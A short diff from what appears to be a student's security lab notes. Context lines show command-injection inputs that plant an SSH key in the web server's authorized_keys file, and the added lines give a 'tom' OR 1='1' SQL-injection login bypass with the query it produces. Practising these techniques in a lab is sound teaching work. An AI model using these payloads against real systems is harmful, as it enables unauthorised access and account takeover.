@@ -128,7 +128,10 @@ cat /home/student/.ssh/id_rsa.pub
 ; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
 ; cat /var/www/.ssh/authorized_keys
 ----------------------------------------------------------------------------------------------------------------------
-
+User enters tom' OR 1='1 in the name and pass fields.
+Truth Statement: tom ' OR 1='1
+Server-Side query executed would appear like this:
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 
 
 
